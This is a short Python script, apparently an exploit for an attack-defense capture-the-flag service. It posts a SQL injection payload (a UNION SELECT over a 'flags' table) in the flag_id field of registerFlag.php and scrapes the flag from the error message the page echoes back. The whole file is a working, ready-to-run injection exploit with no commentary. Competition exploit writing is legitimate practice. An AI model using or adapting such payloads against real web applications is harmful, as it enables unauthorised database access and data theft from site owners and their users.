#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import requests
import re
import sys

def exploit(ip, port, flag_id):
    response = requests.post('http://%s:%d/registerFlag.php' % (ip, int(port)),
        data={
            'flag_id': "abc' AND 0 UNION SELECT 1,flag_content,3,4,5 FROM flags WHERE flag_id='%s' AND ''='" % flag_id,
            'flag_content': 'not empty'
        })
    if response.status_code == requests.codes.ok:
        m = re.search(r'FLAG_ID:\s+(FLG.{13})\s+already registered', response.text)
        if m:
            return m.group(1)
        else:
            raise Exception('Flag not found')
    else:
        raise Exception('Error on remote page')


if __name__ == '__main__':
    print exploit(*sys.argv[1:])

